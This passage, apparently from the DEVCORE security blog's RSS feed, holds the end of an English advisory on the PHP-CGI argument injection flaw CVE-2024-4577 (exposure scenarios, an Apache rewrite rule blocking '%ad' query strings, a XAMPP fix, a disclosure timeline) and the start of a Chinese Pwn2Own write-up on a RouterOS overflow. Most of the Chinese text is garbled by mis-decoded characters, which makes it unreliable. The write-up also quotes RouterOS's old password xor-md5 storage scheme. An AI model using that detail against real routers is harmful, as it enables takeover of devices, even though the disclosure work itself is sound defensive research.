&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;Action&lt;/span&gt; application/x-httpd-php-cgi &quot;/php-cgi/php-cgi.exe&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;scenario-2-exposing-the-php-binary-also-the-default-xampp-configuration&quot;&gt;&lt;strong&gt;Scenario 2&lt;/strong&gt;: Exposing the PHP binary (also the default XAMPP configuration)&lt;/h3&gt;

&lt;p&gt;Even if PHP is not configured under the CGI mode, merely exposing the PHP executable binary in the CGI directory is affected by this vulnerability, too. Common scenarios include, but are not limited to:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Copying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php.exe&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi.exe&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/&lt;/code&gt; directory.&lt;/li&gt;
  &lt;li&gt;Exposing the PHP directory via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptAlias&lt;/code&gt; directive, such as:
    &lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nc&quot;&gt;ScriptAlias&lt;/span&gt; /php-cgi/ &quot;C:/xampp/php/&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;mitigation-measure&quot;&gt;Mitigation Measure&lt;/h2&gt;

&lt;p&gt;It is strongly recommended that all users upgrade to the latest PHP versions of &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.3.8&lt;/a&gt;, &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.2.20&lt;/a&gt;, and &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.1.29&lt;/a&gt;. For systems that cannot be upgraded, the following instructions can be used to temporarily mitigate the vulnerability.&lt;/p&gt;

&lt;p&gt;However, since PHP CGI is an outdated and problematic architecture, itâ€™s still recommended to evaluate the possibility of migrating to a more secure architecture such as Mod-PHP, FastCGI, or PHP-FPM.&lt;/p&gt;

&lt;h3 id=&quot;1-for-users-who-cannot-upgrade-php&quot;&gt;1. For users who cannot upgrade PHP:&lt;/h3&gt;

&lt;p&gt;The following Rewrite Rules can be used to block attacks. Please note that &lt;strong&gt;these rules are only a temporary mitigation for Traditional Chinese, Simplified Chinese, and Japanese locales&lt;/strong&gt;. It is still recommended to update to a patched version or migrate the architecture in practice.&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; %{QUERY_STRING} ^%ad [NC]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; .? - [F,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;2-for-users-who-use-xampp-for-windows&quot;&gt;2. For users who use XAMPP for Windows:&lt;/h3&gt;

&lt;p&gt;XAMPP has not yet released corresponding update files for this vulnerability at the time of writing this article. If you confirm that you do not need the PHP CGI feature, you can avoid exposure to the vulnerability by modifying the following Apache HTTP Server configuration:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;C:/xampp/apache/conf/extra/httpd-xampp.conf&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Locating the corresponding lines:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;ScriptAlias&lt;/span&gt; /php-cgi/ &quot;C:/xampp/php/&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And comment it out:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ScriptAlias /php-cgi/ &quot;C:/xampp/php/&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2024/05/07 - DEVCORE reported this issue through the official PHP vulnerability disclosure page.&lt;/li&gt;
  &lt;li&gt;2024/05/07 - PHP developers confirmed the vulnerability and emphasized the need for a prompt fix.&lt;/li&gt;
  &lt;li&gt;2024/05/16 - PHP developers released the first version of the fix and asked for feedback.&lt;/li&gt;
  &lt;li&gt;2024/05/18 - PHP developers released the second version of the fix and asked for feedback.&lt;/li&gt;
  &lt;li&gt;2024/05/20 - PHP entered the preparation phase for the new version release.&lt;/li&gt;
  &lt;li&gt;2024/06/06 - PHP released new versions &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.3.8&lt;/a&gt;, &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.2.20&lt;/a&gt;, and &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.1.29&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv&quot;&gt;PHP Security Advisory - PHP RCE: A Bypass of CVE-2012-1823, Argument Injection in PHP-CGI&lt;/a&gt; (to be announced)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8&quot;&gt;MS-UCODEREF - Windows Protocols Unicode Reference&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/id/520827&quot;&gt;CERT/CC VU#520827 - PHP-CGI query string parameter vulnerability&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/</link>
                <guid>https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en</guid>
                <pubDate>Thu, 06 Jun 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Pwn2Own Toronto 2022 : A 9-year-old bug in MikroTik RouterOS</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;DEVCORE ç ”ç©¶çµ„åœ¨ Pwn2Own Toronto 2022 ç™½å¸½é§­å®¢ç«¶è³½æœŸé–“ï¼Œé€éç ”ç©¶éå»å°‘æœ‰äººæ³¨æ„åˆ°çš„æ”»æ“Šé¢ï¼Œåœ¨ MikroTik æ——ä¸‹è·¯ç”±å™¨ç”¢å“æ‰€ä½¿ç”¨çš„ RouterOS ä½œæ¥­ç³»çµ±ä¸­ï¼Œç™¼ç¾äº†å­˜åœ¨ä¹å¹´ä¹‹ä¹…çš„ WAN ç«¯å¼±é»ï¼Œé€éä¸²é€£è©²å¼±é»èˆ‡å¦ä¸€å€‹åŒæ¨£ç”± DEVCORE ç™¼ç¾çš„ Canon printer å¼±é»ï¼ŒDEVCORE æˆç‚ºå²ä¸Šç¬¬ä¸€å€‹åœ¨ Pwn2Own è³½äº‹ä¸­æˆåŠŸæŒ‘æˆ° SOHO Smashup é …ç›®çš„éšŠä¼ï¼›æœ€çµ‚ DEVCORE åœ¨ Pwn2Own Toronto 2022 å¥ªä¸‹å† è»ï¼Œä¸¦ç²é ’ç ´è§£å¤§å¸«ï¼ˆMaster of Pwnï¼‰çš„ç¨±è™Ÿã€‚&lt;/p&gt;

&lt;p&gt;è©² WAN ç«¯å¼±é»ç™¼ç”Ÿåœ¨ RouterOS ä¸­çš„ radvd ç¨‹å¼ï¼Œç”±æ–¼è©²ç¨‹å¼åœ¨è™•ç† IPv6 SLAAC çš„ ICMPv6 å°åŒ…æ™‚ï¼Œæœªå° RDNSS æ¬„ä½çš„é•·åº¦é€²è¡Œæª¢æŸ¥ï¼Œå°è‡´æ”»æ“Šè€…å¯é€éç™¼é€å…©æ¬¡ Router Advertisement å°åŒ…è§¸ç™¼ç·©è¡å€æº¢ä½æ”»æ“Šï¼Œä½¿å¾—æ”»æ“Šè€…å¯åœ¨ä¸éœ€ç™»å…¥ä¸”ç„¡éœ€ä½¿ç”¨è€…äº’å‹•çš„æƒ…æ³ä¸‹æ§åˆ¶è·¯ç”±å™¨åº•å±¤çš„ Linux ç³»çµ±é€²è¡Œé«˜æ¬Šé™æ“ä½œï¼Œå–å¾—è·¯ç”±å™¨çš„å®Œæ•´æ§åˆ¶æ¬Šï¼›æ­¤å¼±é»è¢«ç™»è¨˜ç‚º CVE-2023-32154ï¼Œå…¶ CVSS åˆ†æ•¸ç‚º 7.5ã€‚&lt;/p&gt;

&lt;p&gt;é‡å°ä¸Šè¿°å¼±é»ï¼Œ DEVCORE å·²æ–¼ 2022/12/29 ç¶“ç”± &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-710/&quot;&gt;ZDI&lt;/a&gt; å›å ± MikroTik è™•ç†ï¼Œä¸¦åœ¨ 2023/05/19 å®Œæˆä¿®è£œï¼Œä»¥ä¸‹ RouterOS ç‰ˆæœ¬å·²ç¶“å°æ­¤å¼±é»é€²è¡Œä¿®è£œï¼š&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Long-term Release 6.48.7&lt;/li&gt;
  &lt;li&gt;Stable Release 6.49.8&lt;/li&gt;
  &lt;li&gt;Stable Release 7.10&lt;/li&gt;
  &lt;li&gt;Testing Release 7.10rc6&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;pwn2own-èˆ‡-soho-smashup-ç°¡ä»‹&quot;&gt;Pwn2Own èˆ‡ SOHO Smashup ç°¡ä»‹&lt;/h2&gt;

&lt;p&gt;Pwn2Own æ˜¯ä¸€ç³»åˆ—ç”±è¶¨å‹¢ç§‘æŠ€çš„ Zero Day Initiativeï¼ˆZDIï¼‰ä¸»è¾¦çš„æ¯”è³½ï¼Œæ¯å ´è³½äº‹éƒ½æœƒé‡å°è©²æ¬¡ä¸»é¡ŒæŒ‘é¸ä¸€äº›ç†±é–€çš„ç”¢å“ä½œç‚ºç›®æ¨™ï¼Œä¾‹å¦‚ï¼šä½œæ¥­ç³»çµ±ã€ç€è¦½å™¨ã€é›»å‹•è»Šã€å·¥æ§ç³»çµ±ã€è·¯ç”±å™¨ã€å°è¡¨æ©Ÿã€æ™ºæ…§éŸ³ç®±ã€æ‰‹æ©Ÿã€NASã€ç¶²è·¯æ”å½±æ©Ÿâ€¦â€¦ç­‰ç­‰ã€‚åªè¦åƒè³½éšŠä¼å¯ä»¥åœ¨ç„¡éœ€ä½¿ç”¨è€…äº’å‹•ã€è¨­å‚™è™•æ–¼é è¨­ç‹€æ…‹ã€è»Ÿé«”æ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬çš„æ¢ä»¶ä¸‹ï¼Œæ¼”ç¤ºæ”»æ“Šä¸¦æˆåŠŸç²å¾—è¨­å‚™çš„ä¸»æ§æ¬Šï¼Œå°±å¯ä»¥ç²å¾—ç›¸æ‡‰çš„ Master of Pwn é»æ•¸å’Œçé‡‘ã€‚è³½æœ«çµç®—æ™‚ï¼ŒMaster of Pwn é»æ•¸æœ€é«˜çš„éšŠä¼å°±æ˜¯å† è»ï¼Œä¹Ÿè¢«ç¨±ç‚ºç ´è§£å¤§å¸«ï¼ˆMaster of Pwnï¼‰ã€‚&lt;/p&gt;

&lt;p&gt;å‰å¹¾å¹´ç”±æ–¼ç–«æƒ…çš„é—œä¿‚ï¼ŒWork From Home æˆ–æ˜¯ SOHOï¼ˆå³å°å‹è¾¦å…¬ï¼å®¶åº­è¾¦å…¬ï¼‰è®Šå¾—éå¸¸æ™®éï¼Œå› æ­¤ 2022 çš„ Pwn2Own  Toronto ä¹Ÿæ–°å¢äº†ä¸€å€‹ç¨±ä½œ SOHO Smashup çš„ç‰¹åˆ¥é …ç›®ï¼Œåƒè³½è€…éœ€è¦å¾ WAN ç«¯å…¥ä¾µè·¯ç”±å™¨å¾Œï¼Œå†å°‡è·¯ç”±å™¨ä½œç‚ºè·³æ¿æ”»æ“Šå±…å®¶å¸¸è¦‹çš„è¨­å‚™ï¼Œä¾‹å¦‚ï¼šæ™ºæ…§éŸ³éŸ¿ã€å°è¡¨æ©Ÿç­‰è¨­å‚™ã€‚&lt;/p&gt;

&lt;p&gt;é€™å€‹ç‰¹åˆ¥çš„æ–°é …ç›®ï¼Œé™¤äº†çé‡‘æ˜¯æ‰€æœ‰é …ç›®ä¸­ç¬¬äºŒé«˜çš„ $100,000ï¼ˆUSDï¼‰ä¹‹å¤–ï¼Œå¾—åˆ†ä¹Ÿæ˜¯æœ€é«˜çš„ååˆ†ï¼Œå› æ­¤å¦‚æœç›®æ¨™æ˜¯å¥ªå† ï¼Œå¥ªä¸‹é€™å€‹é …ç›®çµ•å°æ˜¯å¦‚è™æ·»ç¿¼ï¼DEVCORE åœ¨æœ¬æ¬¡è³½äº‹ä¸­ä¹Ÿç‰¹åˆ¥æŒ‘é¸è¼ƒå°‘äººç ”ç©¶çš„ MikroTik ä½œç‚ºç›®æ¨™ï¼Œé¿å…èˆ‡ä»–äººæ‰¾åˆ°é‡è¤‡çš„æ¼æ´ï¼ˆèˆ‡å…¶ä»–äººæ’æ´æ™‚ï¼Œçé‡‘èˆ‡å¾—åˆ†çš†æ¸›åŠï¼‰ï¼Œæœ€å¤§åŒ–å¥ªå† çš„æ©Ÿç‡ã€‚&lt;/p&gt;

&lt;h2 id=&quot;routeros-ç°¡ä»‹&quot;&gt;RouterOS ç°¡ä»‹&lt;/h2&gt;

&lt;p&gt;MikroTik é–‹ç™¼çš„ RouterOS æ˜¯ä¸€å¥—åŸºæ–¼ Linux æ ¸å¿ƒçš„ä½œæ¥­ç³»çµ±ï¼Œä¹Ÿæ˜¯ MikroTik æ——ä¸‹ç”¢å“ ã€ŒRouterBoardã€ä¸Šé è¨­å®‰è£çš„ä½œæ¥­ç³»çµ±ï¼ŒRouterOS äº¦å¯è¢«å®‰è£åœ¨å€‹äººé›»è…¦ä¸Šï¼Œç”¨ä¾†å°‡é›»è…¦ä½œç‚ºè·¯ç”±å™¨ä½¿ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;é›–ç„¶åŸºæ–¼ Linux æ ¸å¿ƒé–‹ç™¼çš„ RouterOS ç¢ºå¯¦æœ‰ä½¿ç”¨ GPL æˆæ¬Šçš„é–‹æºè»Ÿé«”ï¼Œä½†å¦‚æœæƒ³è¦å¾—åˆ°ç›¸é—œçš„ç¨‹å¼ç¢¼ï¼Œæ ¹æ“šå®˜æ–¹ç¶²ç«™ &lt;a href=&quot;https://web.archive.org/web/20220603140018/https://mikrotik.com/downloadterms.html&quot;&gt;downloadterms&lt;/a&gt; çš„èªªæ˜ï¼Œéœ€è¦åŒ¯ 45 å¡Šç¾é‡‘çµ¦ MikroTik ï¼Œä»–å€‘æ‰æœƒå¯„çµ¦ä½ ä¸€å¼µç‡’å¥½ GPL source çš„å…‰ç¢Ÿï¼Œéå¸¸æœ‰è¶£çš„æƒ³æ³•ï¼å¹¸å¥½å·²ç¶“æœ‰äººå°‡ MikroTik çš„ &lt;a href=&quot;https://github.com/robimarko/routeros-GPL&quot;&gt;GPL source&lt;/a&gt;ä¸Šå‚³åˆ° Githubï¼Œä½†åœ¨æª¢è¦–éå¾Œï¼Œæˆ‘å€‘èªç‚ºè£¡é¢çš„ç¨‹å¼ç¢¼å°æ–¼å¾ŒçºŒåˆ†ææ²’æœ‰å¤ªå¤§çš„å¹«åŠ©ã€‚&lt;/p&gt;

&lt;h3 id=&quot;routeros-v7-èˆ‡-routeros-v6&quot;&gt;RouterOS v7 èˆ‡ RouterOS v6&lt;/h3&gt;

&lt;p&gt;åœ¨ MikroTik å®˜ç¶²çš„ä¸‹è¼‰é é¢ä¸ŠåŒæ™‚å­˜åœ¨ RouterOS v7 ä»¥åŠ RouterOS v6 å…©å€‹ç‰ˆæœ¬ï¼Œå…©è€…ä¹‹é–“çš„é—œä¿‚æ¯”è¼ƒåƒæ˜¯ RouterOS çš„ä¸åŒ branchï¼Œåœ¨è¨­è¨ˆä¸Šå¤§åŒå°ç•°ã€‚å› ç‚ºæˆ‘å€‘çš„ç›®æ¨™è¨­å‚™ RouterBoard RB2011UiAS-IN é è¨­å®‰è£çš„æ˜¯ RouterOS v6ï¼Œæ‰€ä»¥æˆ‘å€‘å…ˆä»¥ RouterOS v6 ä½œç‚ºç ”ç©¶å°è±¡ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;RouterOS ä¸¦æ²’æœ‰æ­£å¼æä¾›ä¸€å€‹æ–¹æ³•è®“ä½¿ç”¨è€…ç›´æ¥ç®¡ç†åº•å±¤çš„ Linux ç³»çµ±ï¼Œä½¿ç”¨è€…è¢«é—œåœ¨ä¸€å€‹åŠŸèƒ½å—é™çš„ console è£¡é¢ï¼Œåªèƒ½ä½¿ç”¨ RouterOS æä¾›çš„æœ‰é™æŒ‡ä»¤å»ç®¡ç†é€™å°è·¯ç”±å™¨ã€‚å› æ­¤éå»æœ‰ä¸å°‘ç ”ç©¶æ˜¯é—œæ–¼å¦‚ä½• jailbreak RouterOSã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;RouterOS ä¸Šçš„ binary ä¹‹é–“ä½¿ç”¨ä¸€ç¨® MikroTik è‡ªè£½çš„ IPC é€²è¡Œæºé€šï¼Œæ­¤ IPC åˆ©ç”¨ç¨±ç‚º nova message çš„è³‡æ–™çµæ§‹åœ¨å„ç¨‹å¼é–“äº¤æ›è³‡è¨Šï¼Œå› æ­¤æˆ‘å€‘å°‡é€™é¡ binary çµ±ä¸€ç¨±ä½œ nova binaryã€‚&lt;/p&gt;

&lt;p&gt;å¦å¤–ï¼ŒRouterOS é‚„å­˜åœ¨ä¸€å€‹æ¯”è¼ƒç‰¹åˆ¥çš„æ”»æ“Šé¢ã€‚åœ¨æ—¥å¸¸æ‡‰ç”¨ä¸­ï¼Œä½¿ç”¨è€…å¯ä»¥é€é WinBox é€™å¥— GUI ç®¡ç†å·¥å…·åœ¨ Windows é›»è…¦ä¸Šå° RouterOS é€²è¡Œé ç«¯ç®¡ç†ï¼Œå…¶åŸç†æ˜¯é€é TCP å‘è·¯ç”±å™¨å‚³é€ nova messageã€‚å› æ­¤è‹¥ RouterOS æ²’æœ‰é‡å° nova message åšå¥½æ¬Šé™é©—è­‰æ™‚ï¼Œæ”»æ“Šè€…å°±æœ‰æ©Ÿæœƒè‡ªé ç«¯ç™¼é€ä¸€å€‹å¤¾å¸¶æƒ¡æ„ nova message çš„ TCP å°åŒ…å…¥ä¾µè·¯ç”±å™¨ï¼›ä¸é WinBox é è¨­åƒ…èƒ½å¾ LAN ç«¯ä½¿ç”¨ï¼Œå°æˆ‘å€‘ä¾†èªªä¸æ˜¯å„ªå…ˆäº‹é …ï¼Œå› ç‚ºé€™æ¬¡çš„ç›®æ¨™æ˜¯å¾ WAN ç«¯é€²è¡Œæ”»æ“Šï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-å›é¡§&quot;&gt;CVE å›é¡§&lt;/h2&gt;

&lt;p&gt;é¦–å…ˆï¼Œç‚ºäº†ç†Ÿæ‚‰ RouterOS çš„æ”»æ“Šé¢ï¼Œæˆ‘å€‘å…¨é¢å¯©è¦–äº†éå»çš„ CVEã€‚ç•¶æ™‚èˆ‡ RouterOS æœ‰é—œçš„ CVE ç¸½å…±æœ‰ 80 å€‹ï¼Œè€Œç•¶ä¸­å¯è¢«ç”¨ä¾†åœ¨ pre-auth æƒ…å¢ƒä¸‹é€²è¡Œæ”»æ“Šï¼Œä¸”ç›®æ¨™æ˜¯è·¯ç”±å™¨æœ¬èº«çš„å…±æœ‰ 28 å€‹ ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;28 å€‹ CVE ç•¶ä¸­æœ‰ 4 å€‹ CVE çš„ä½¿ç”¨æƒ…å¢ƒæ˜¯è¼ƒç¬¦åˆ Pwn2Own è¦å‰‡æ‰€æè¿°çš„æƒ…å¢ƒï¼Œé€™äº› CVE å¯ä»¥è®“æ”»æ“Šè€…åœ¨ä¸éœ€ä½¿ç”¨è€…äº’å‹•çš„æƒ…æ³ä¸‹åœ¨è·¯ç”±å™¨ä¸Šå–šèµ·ä¸€å€‹ shell æˆ–ç™»å…¥ç‚º adminã€‚é€™ 4 å€‹æ¼æ´ç•¶ä¸­ï¼Œæœ‰ 3 å€‹æ˜¯åœ¨ 2017 å¹´è‡³ 2019 å¹´é€™æ®µæ™‚é–“è¢«ç™¼ç¾çš„ï¼Œè€Œä¸”ç•¶ä¸­ 3 å€‹æ˜¯ã€Œin the wildã€è€Œä¸æ˜¯ç¬¬ä¸€æ™‚é–“ç¶“ç”±ç™½å¸½é§­å®¢ä¸»å‹•é€šå ±ï¼Œé€™å››å€‹æ¼æ´åˆ†åˆ¥æ˜¯ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2017-20149ï¼šåˆç¨± Chimay-Redï¼Œæ˜¯ 2017 å¹´å¾ CIA å¤–æ´©çš„æ­¦å™¨åº«ã€ŒVault 7ã€ä¸­ï¼Œé‡å° RouterOS é€²è¡Œæ”»æ“Šçš„æ¼æ´ä¹‹ä¸€ã€‚æ¼æ´ç™¼ç”Ÿåœ¨ RouterOS è§£æ HTTP è«‹æ±‚æ™‚ï¼Œè‹¥ HTTP headers ä¸­çš„ Content-Length æ˜¯è² å€¼ï¼Œæœƒé€ æˆ Integer Underflowï¼Œæ­é… Stack Clash çš„æ”»æ“Šæ‰‹æ³•å°±èƒ½æ§åˆ¶ç¨‹å¼æµç¨‹é”æˆ RCEã€‚&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1&quot;&gt;CVE-2018-7445&lt;/a&gt;ï¼šæ˜¯ä¸€å€‹å­˜åœ¨æ–¼ RouterOS è‡ªå·±å¯¦åšçš„ SMB ä¸­çš„ buffer overflowã€‚é€™æ˜¯é€éé»‘ç®±æ¨¡ç³Šæ¸¬è©¦æ‰¾åˆ°çš„æ¼æ´ï¼Œä¹Ÿæ˜¯å››å€‹æ¼æ´ä¸­å”¯ä¸€ä¸€å€‹ç”±ç™¼ç¾è€…è‡ªè¡Œå›å ±çš„æ¼æ´ï¼Œä¸€æ¨£èƒ½å¤ æ§åˆ¶ç¨‹å¼åŸ·è¡Œæµç¨‹æœ€å¾Œé”æˆ RCEï¼Œä½† SMB ä¸æ˜¯é è¨­é–‹å•Ÿçš„æœå‹™ã€‚&lt;/li&gt;
  &lt;li&gt;CVE-2018-14847ï¼šä¹Ÿæ˜¯ã€ŒVault 7ã€ä¸­é‡å° RouterOS é€²è¡Œæ”»æ“Šçš„æ¼æ´ä¹‹ä¸€ã€‚é€™å€‹æ¼æ´ä½¿æ”»æ“Šè€…å¯ä»¥ä¸éœ€ç™»å…¥å°±è®€å–ä»»æ„æª”æ¡ˆï¼Œä¹è½ä¹‹ä¸‹å¥½åƒä¸æ˜¯å¤§å•é¡Œï¼Œä½†ç”±æ–¼åœ¨ RouterOS çš„æ—©æœŸç‰ˆæœ¬ä¸­ï¼Œä½¿ç”¨è€…çš„å¯†ç¢¼æ˜¯ä»¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password xor md5(username + &quot;283i4jfkai3389&quot;)&lt;/code&gt; çš„æ–¹å¼å„²å­˜åœ¨æª”æ¡ˆä¸­ï¼Œæ‰€ä»¥åªè¦èƒ½å¤ è®€å–é€™å€‹æª”æ¡ˆï¼Œæ”»æ“Šè€…å°±å¯ä»¥é€†ç®—å¾—åˆ° admin çš„å¯†ç¢¼ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://teamt5.org/en/posts/vulnerability-mikrotik-cve-2021-41987/&quot;&gt;CVE-2021-41987&lt;/a&gt;ï¼šåœ¨ SCEP æœå‹™çš„ base64 è§£ç¢¼éç¨‹ä¸­ï¼Œå› ç‚ºé•·åº¦è¨ˆç®—éŒ¯èª¤å°è‡´çš„ heap buffer overflow æ¼æ´ï¼Œé€™æ˜¯è³‡å®‰ç ”ç©¶å“¡åˆ†æäº† APT åœ¨å…¶ C2 server ä¸Šçš„ exploit å¾Œåæ¨å‡ºä¾†çš„æ¼æ´ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¯ä»¥ç™¼ç¾ï¼Œé€™äº›æ¼æ´å¤§å¤šæ˜¯ã€Œin the wildã€ï¼Œæˆ‘å€‘ç„¡å¾å¾—çŸ¥ç•¶åˆç™¼ç¾æ¼æ´çš„äººæ˜¯å¦‚ä½•é€²è¡Œåˆ†æåŠæ€è€ƒã€‚å› æ­¤é—œæ–¼åˆ†æ RouterOS çš„æ€è·¯æˆ–æ˜¯æŠ€å·§ï¼Œé€éé€™äº›æ¼æ´èƒ½å­¸ç¿’åˆ°çš„ååˆ†æœ‰é™ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ç›¸é—œç ”ç©¶å›é¡§&quot;&gt;ç›¸é—œç ”ç©¶å›é¡§&lt;/h2&gt;

&lt;p&gt;æˆ‘å€‘ç¹¼çºŒç ”è®€å…¬é–‹çš„ç ”ç©¶è³‡æ–™ï¼Œåœ¨æ¯”è³½çš„ç•¶ä¸‹æˆ‘å€‘æœ‰é€™äº›æ–‡ç« ä»¥åŠæ¼”è¬›å¯ä»¥åƒè€ƒï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;2017
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-08-06_prez_SHA_MT_pub.pdf&quot;&gt;Kirils. Rooting the MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;ä¸»è¦é—œæ–¼ jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-09-15_prez_15_MT_Balccon_pub.pdf&quot;&gt;Kirils. A deeper journey into MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;ä¸»è¦é—œæ–¼ jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-10-21_MT_Hacktivity_pub.pdf&quot;&gt;Kirils. Tools for effortless reverse engineering of MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;ä¸»è¦é—œæ–¼ jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2018
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://github.com/tenable/routeros&quot;&gt;Jacob Baines. Bug Hunting in RouterOS&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;æ¢è¨ IPC ä¸­çš„ nova message çš„é‹ä½œ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2019
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/make-it-rain-with-mikrotik-c90705459bc6&quot;&gt;Jacob Baines. Make It Rain with MikroTik&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;èˆ‡ 2018 çš„æ¼”è¬›å…§å®¹ç›¸åŒ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/mikrotik-firewall-nat-bypass-b8d46398bf24&quot;&gt;Jacob Baines. MikroTik Firewall &amp;amp; NAT Bypass&lt;/a&gt;
        &lt;ul&gt;
